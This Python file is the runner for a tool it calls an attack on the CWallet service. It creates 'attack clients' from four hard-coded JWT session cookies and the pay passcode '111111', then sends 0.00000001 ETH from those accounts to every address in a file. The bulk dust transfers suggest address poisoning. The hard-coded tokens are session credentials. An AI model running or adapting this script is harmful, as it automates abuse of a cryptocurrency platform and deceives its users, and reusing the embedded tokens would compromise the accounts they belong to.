import asyncio
from script import executeAttack
from attack import CWalletClient
from coin import COINS
import logging
from logging.handlers import RotatingFileHandler


def setup_logging(enabled: bool = True):
    if not enabled:
        logging.disable(logging.CRITICAL)
        return
    # Keep root logger quiet
    logging.getLogger().setLevel(logging.WARNING)

    # File handler
    handler = RotatingFileHandler(
        "cwallet_debug.log",
        maxBytes=2_000_000,
        backupCount=3
    )
    handler.setLevel(logging.DEBUG)

    formatter = logging.Formatter(
        "%(asctime)s | %(levelname)s | %(name)s | %(message)s"
    )
    handler.setFormatter(formatter)

    # Attach ONLY to your module logger
    attack_logger = logging.getLogger("attack")
    attack_logger.setLevel(logging.DEBUG)
    attack_logger.addHandler(handler)

    # Silence noisy libraries explicitly
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)
    logging.getLogger("asyncio").setLevel(logging.WARNING)



async def main():
    # Cookies
    clients = []
    cookies = [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzI3NmZnejg5M2pieWhibTh6YWplc3dwZXBqeSIsInNlc3Npb25faWQiOiI0MDk2NXBkcGZzamZmN3lrZGVud3k5cW9pemg5NGEiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MDI3MjMsImlhdCI6MTc3MTgzMDcyM30.Pc8VsLkSU3Rx584fBAiAxBwizJKHGnPNdRAB0XFziME",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzIxdDhrNzliNnM3eWl0ajlveWs1ZnRva3pvYyIsInNlc3Npb25faWQiOiI0MDk2enVnNWNwcDM5amJnZmQ5eXppa2Z4ZzdqNHciLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MDExNzQsImlhdCI6MTc3MTgyOTE3NH0.riaGufU_S2xbtbT7R1gQkVDzN-eL6Y0FKowAXMrpoiA",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzIzYzQ0eWZhanJ0eTRmamhydTV3aG43NjRjZSIsInNlc3Npb25faWQiOiI0MDk2ZWdncXNvYTY4ZjhvdHk4NWFjajNlMXphcmEiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MDEyODIsImlhdCI6MTc3MTgyOTI4Mn0.8Ty_Ftye_rFO5ANa_PgpbFSZEpj1WaivD7WJMaYbAvY",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNzM3Mjhlczlvb3p5dW4zOG9kOGJ5cm83M3llbXhqYSIsInNlc3Npb25faWQiOiI0MDk2MW1uNGJnaWY2dHI0dDg5ejdvZWduMWh4dXciLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ5MDE0MDIsImlhdCI6MTc3MTgyOTQwMn0._exQvgpr2KRAHMuXosTY0Fzp0q5xvHtPG4qeMXLACPw"
    ]
    # Creating attack clients
    for cookie in cookies:
        clients.append(CWalletClient(authCookie=cookie, payPassCode="111111"))

    # Getting Addresses
    addressesFileName = "manual.txt"
    resultsFileName = "results_eth.txt"
    amount = "0.00000001"
    cryptoCoin = COINS["ETH"]

    await executeAttack(
        addressesFileName=addressesFileName,
        resultsFileName=resultsFileName,
        clients=clients,
        coin=cryptoCoin,
        amount=amount
    )

if __name__ == "__main__":
    setup_logging(enabled=True)
    asyncio.run(main())
